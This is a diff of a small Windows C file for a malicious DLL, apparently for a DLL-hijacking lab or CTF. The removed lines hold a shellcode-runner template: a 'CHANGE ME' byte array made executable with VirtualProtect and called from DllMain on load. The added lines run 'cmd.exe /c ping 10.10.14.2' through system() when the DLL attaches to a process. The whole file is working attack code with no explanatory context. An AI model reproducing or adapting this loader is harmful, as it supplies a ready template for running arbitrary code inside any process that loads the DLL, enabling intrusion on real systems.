@@ -1,23 +1,18 @@
+#include <stdlib.h>
 #include <windows.h>
-/** CHANGE ME **/
-unsigned char shellcode[] = 
-"\xd3\x3d\xb3\x3f";
-/** CHANGE ME **/
-void RunShellcode() {
-    DWORD oldProtect;
-    VirtualProtect(shellcode, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &oldProtect);
-    ((void(*)())shellcode)();
+BOOL APIENTRY DllMain(HMODULE hModule,
+DWORD ul_reason_for_call,
+LPVOID lpReserved
+)
+{
+switch (ul_reason_for_call)
+{
+case DLL_PROCESS_ATTACH:
+system("cmd.exe /c ping 10.10.14.2");
+case DLL_THREAD_ATTACH:
+case DLL_THREAD_DETACH:
+case DLL_PROCESS_DETACH:
+break;
 }
-
-BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
-    switch (fdwReason) {
-        case DLL_PROCESS_ATTACH:
-            RunShellcode();
-            break;
-        case DLL_THREAD_ATTACH:
-        case DLL_THREAD_DETACH:
-        case DLL_PROCESS_DETACH:
-            break;
-    }
-    return TRUE;
+return TRUE;
 }
